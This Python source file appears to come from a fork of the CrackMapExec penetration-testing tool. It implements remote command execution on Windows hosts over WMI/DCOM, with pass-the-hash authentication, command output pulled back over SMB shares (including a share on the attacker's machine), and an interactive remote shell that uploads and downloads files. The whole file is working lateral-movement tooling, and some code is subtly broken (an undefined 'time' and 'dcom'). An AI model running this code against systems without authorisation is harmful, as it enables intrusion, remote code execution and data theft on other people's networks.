import ntpath, logging
import os
import cmd
import sys

from gevent import sleep
from cme.helpers.misc import gen_random_string
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dtypes import NULL

OUTPUT_FILENAME = '__output'
CODEC = sys.stdout.encoding

class WMIEXEC:
    def __init__(self, target, share_name, username, password, domain, smbconnection, doKerberos=False, aesKey=None, kdcHost=None, hashes=None, share='C$'):
        self.__target = target
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__share = share
        self.__smbconnection = smbconnection
        self.__output = None
        self.__outputBuffer = ''
        self.__share_name = share_name
        self.__shell = 'cmd.exe /Q /c '
        self.__pwd = 'C:\\'
        self.__aesKey = aesKey
        self.__kdcHost = kdcHost
        self.__doKerberos = doKerberos
        self.__retOutput = True
        self.__remoteshell = None

        if hashes is not None:
        #This checks to see if we didn't provide the LM Hash
            if hashes.find(':') != -1:
                self.__lmhash, self.__nthash = hashes.split(':')
            else:
                self.__nthash = hashes

        if self.__password is None:
            self.__password = ''

        self.__dcom = DCOMConnection(self.__target, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey, oxidResolver=True, doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)
        
        try:
            iInterface = self.__dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login,wmi.IID_IWbemLevel1Login)
            iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
            iWbemServices= iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
            iWbemLevel1Login.RemRelease()

            self.__win32Process,_ = iWbemServices.GetObject('Win32_Process')
            self.__remoteshell = RemoteShell(self.__share, self.__win32Process, self.__smbconnection)

        except  (Exception, KeyboardInterrupt) as e:
            logging.debug('Failed to init dcom')
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
                logging.error(str(e))
            if smbconnection is not None:
                smbconnection.logoff()
            self.__dcom.disconnect()
            sys.stdout.flush()

    def execute(self, command, output=False):
        self.__retOutput = output
        if self.__retOutput:
            self.__smbconnection.setTimeout(900)

        if os.path.isfile(command):
            with open(command) as commands:
                for c in commands:
                    self.__outputBuffer = self.__remoteshell.exec_cmd(c.strip())
        else:
            self.__outputBuffer = self.__remoteshell.exec_cmd(command)

        if self.__smbconnection is not None:
            self.__smbconnection.logoff()

        return self.__outputBuffer


    #def execute_orig(self, command, output=False):
    #    self.__retOutput = output
    #    if self.__retOutput:
    #        self.__smbconnection.setTimeout(900)
    #    if os.path.isfile(command):
    #        with open(command) as commands:
    #            for c in commands:
    #                self.execute_handler(c.strip())
    #    else:
    #        self.execute_handler(command)
    #    self.__dcom.disconnect()
    #    try:
    #        if isinstance(self.__outputBuffer, str):
    #            return self.__outputBuffer
    #        return self.__outputBuffer.decode()
    #    except UnicodeDecodeError:
    #        logging.debug('Decoding error detected, consider running chcp.com at the target, map the result with https://docs.python.org/3/library/codecs.html#standard-encodings')
    #        return self.__outputBuffer.decode('cp437')

    def cd(self, s):
        self.execute_remote('cd ' + s)
        if len(self.__outputBuffer.strip('\r\n')) > 0:
            print(self.__outputBuffer)
            self.__outputBuffer = b''
        else:
            self.__pwd = ntpath.normpath(ntpath.join(self.__pwd, s))
            self.execute_remote('cd ')
            self.__pwd = self.__outputBuffer.strip('\r\n')
            self.__outputBuffer = b''

    def output_callback(self, data):
        self.__outputBuffer += data

    def execute_handler(self, data):
        if self.__retOutput:
            try:
                logging.debug('Executing remote')
                self.execute_remote(data)
            except:
                self.cd('\\')
                self.execute_remote(data)
        else:
            self.execute_remote(data)

    def execute_remote(self, data):
        self.__output = '\\Windows\\Temp\\' + gen_random_string(6)

        command = self.__shell + data
        if self.__retOutput:
            command += ' 1> ' + '\\\\127.0.0.1\\%s' % self.__share + self.__output  + ' 2>&1'

        logging.debug('Executing command: ' + command)
        self.__win32Process.Create(command, self.__pwd, None)
        self.get_output_remote()

    def execute_fileless(self, data):
        self.__output = gen_random_string(6)
        local_ip = self.__smbconnection.getSMBServer().get_socket().getsockname()[0]

        command = self.__shell + data + ' 1> \\\\{}\\{}\\{} 2>&1'.format(local_ip, self.__share_name, self.__output)

        logging.debug('Executing command: ' + command)
        self.__win32Process.Create(command, self.__pwd, None)
        self.get_output_fileless()

    def get_output_fileless(self):
        while True:
            try:
                with open(os.path.join('/tmp', 'cme_hosted', self.__output), 'r') as output:
                    self.output_callback(output.read())
                break
            except IOError:
                sleep(2)

    def get_output_remote(self):
        if self.__retOutput is False:
            self.__outputBuffer = ''
            return

        while True:
            try:
                self.__smbconnection.getFile(self.__share, self.__output, self.output_callback)
                break
            except Exception as e:
                if str(e).find('STATUS_SHARING_VIOLATION') >=0:
                    # Output not finished, let's wait
                    sleep(2)
                    pass
                else:
                    #print str(e)
                    pass

        self.__smbconnection.deleteFile(self.__share, self.__output)

    def run(self, addr, dummy):
        """ starts interactive shell """
        self.shell = None
        logging.debug('inside wmishell.run')

        try:
            self.shell = RemoteShell(self.__share, self.__win32Process, self.__smbconnection)
            self.shell.cmdloop()

        except (Exception, KeyboardInterrupt) as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(str(e))
            if self.__smbconnection is not None:
                self.__smbconnection.logoff()
            dcom.disconnect()
            sys.stdout.flush()
            sys.exit(1)

        try:
            if self.__smbconnection is not None:
                self.__smbconnection.logoff()
            dcom.disconnect()

        except (Exception, KeyboardInterrupt) as e:
            logging.debug('Error: {}'.format(e))


class RemoteShell(cmd.Cmd):
    ''' Interactive Shell stuffs ~ awsmhacks '''
    def __init__(self, share, win32Process, smbConnection):
        cmd.Cmd.__init__(self)
        self.__share = share
        self.__output = '\\' + OUTPUT_FILENAME
        self.__outputBuffer = str('')
        self.__shell = 'cmd.exe /Q /c '
        self.__win32Process = win32Process
        self.__transferClient = smbConnection
        self.__pwd = str('C:\\')
        self.__noOutput = False
        self.intro = "   .... I'm in \n Type help for extra shell commands"

        logging.debug('inside wmi.RemoteShell.init')

        # We don't wanna deal with timeouts from now on.
        if self.__transferClient is not None:
            self.__transferClient.setTimeout(900)
            self.do_cd('\\')
        else:
            self.__noOutput = True

    def do_shell(self, s):
        logging.debug('inside wmi.RemoteShell.do_shell')
        os.system(s)

    def do_help(self, line):
        print("""
 lcd {path}                 - changes the current local directory to {path}
 exit                       - terminates the server process (and this session)
 put {src_file, dst_path}   - uploads a local file to the dst_path (dst_path = default current directory)
 get {file}                 - downloads pathname to the current local dir 
 ! {cmd}                    - executes a local shell cmd
""")

    def do_lcd(self, s):
        if s == '':
            print(os.getcwd())
        else:
            try:
                os.chdir(s)
            except Exception as e:
                logging.error(str(e))

    def do_get(self, src_path):

        try:
            import ntpath
            newPath = ntpath.normpath(ntpath.join(self.__pwd, src_path))
            drive, tail = ntpath.splitdrive(newPath)
            filename = ntpath.basename(tail)
            fh = open(filename,'wb')
            logging.info("Downloading %s\\%s" % (drive, tail))
            self.__transferClient.getFile(drive[:-1]+'$', tail, fh.write)
            fh.close()

        except Exception as e:
            logging.error(str(e))

            if os.path.exists(filename):
                os.remove(filename)

    def do_put(self, s):
        try:
            params = s.split(' ')
            if len(params) > 1:
                src_path = params[0]
                dst_path = params[1]
            elif len(params) == 1:
                src_path = params[0]
                dst_path = ''

            src_file = os.path.basename(src_path)
            fh = open(src_path, 'rb')
            dst_path = dst_path.replace('/', '\\')
            import ntpath
            pathname = ntpath.join(ntpath.join(self.__pwd, dst_path), src_file)
            drive, tail = ntpath.splitdrive(pathname)
            logging.info("Uploading %s to %s" % (src_file, pathname))
            self.__transferClient.putFile(drive[:-1] + '$', tail, fh.read)
            fh.close()
        except Exception as e:
            logging.critical(str(e))
            pass

    def do_exit(self, s):
        return True

    def emptyline(self):
        return False

    def do_cd(self, s):
        logging.debug('inside wmi.RemoteShell.do_cd')
        self.execute_remote('cd ' + s)
        if len(self.__outputBuffer.strip('\r\n')) > 0:
            print(self.__outputBuffer)
            self.__outputBuffer = ''

        else:
            self.__pwd = ntpath.normpath(ntpath.join(self.__pwd, s))
            self.execute_remote('cd ')
            self.__pwd = self.__outputBuffer.strip('\r\n')
            self.prompt = (self.__pwd + '>')
            self.__outputBuffer = ''

    def default(self, line):
        logging.debug('inside wmi.RemoteShell.default')
        # Let's try to guess if the user is trying to change drive
        if len(line) == 2 and line[1] == ':':
            # Execute the command and see if the drive is valid
            self.execute_remote(line)
            if len(self.__outputBuffer.strip('\r\n')) > 0: 
                # Something went wrong
                print(self.__outputBuffer)
                self.__outputBuffer = ''
            else:
                # Drive valid, now we should get the current path
                self.__pwd = line
                self.execute_remote('cd ')
                self.__pwd = self.__outputBuffer.strip('\r\n')
                self.prompt = (self.__pwd + '>')
                self.__outputBuffer = ''
        else:
            if line != '':
                self.send_data(line)

    def get_output(self):
        logging.debug('inside wmi.RemoteShell.get_output')

        def output_callback(data):
            try:
                self.__outputBuffer += data.decode(CODEC)
            except UnicodeDecodeError:
                logging.error('Decoding error detected, consider running chcp.com at the target,\nmap the result with '
                              'https://docs.python.org/2.4/lib/standard-encodings.html\nand then execute wmiexec.py '
                              'again with -codec and the corresponding codec')
                self.__outputBuffer += data.decode(CODEC, errors='replace')

        if self.__noOutput is True:
            self.__outputBuffer = ''
            return

        while True:
            try:
                self.__transferClient.getFile(self.__share, self.__output, output_callback)
                break
            except Exception as e:
                if str(e).find('STATUS_SHARING_VIOLATION') >=0:
                    # Output not finished, let's wait
                    time.sleep(1)
                    pass
                elif str(e).find('Broken') >= 0:
                    # The SMB Connection might have timed out, let's try reconnecting
                    logging.debug('Connection broken, trying to recreate it')
                    self.__transferClient.reconnect()
                    return self.get_output()
        self.__transferClient.deleteFile(self.__share, self.__output)

    def execute_remote(self, data):
        logging.debug('inside wmi.RemoteShell.execute_remote')
        command = self.__shell + data 
        if self.__noOutput is False:
            command += ' 1> ' + '\\\\127.0.0.1\\%s' % self.__share + self.__output + ' 2>&1'

        self.__win32Process.Create(command, self.__pwd, None)
        self.get_output()

    def send_data(self, data):
        logging.debug('inside wmi.RemoteShell.send_data')
        self.execute_remote(data)
        print(self.__outputBuffer)
        self.__outputBuffer = ''



    def exec_cmd(self,data):
        '''Execute a single command. 
        LOL look at this wonky shit i did 
        '''

        #store OG stdout
        a, b, c = sys.stdout, sys.stdin, sys.stderr

        #switch stdout to our 'buffer'
        dummy_out = os.path.expanduser('~/.cme/logs/temp.txt')
        buff = open(dummy_out,"w")
        sys.stdout, sys.stdin, sys.stderr = buff, buff, buff

        self.onecmd(data)

        # switch back to normal
        sys.stdout, sys.stdin, sys.stderr = a, b, c 
        buff.close()

        with open(dummy_out, 'r') as file:
            data = file.read()
        
        return data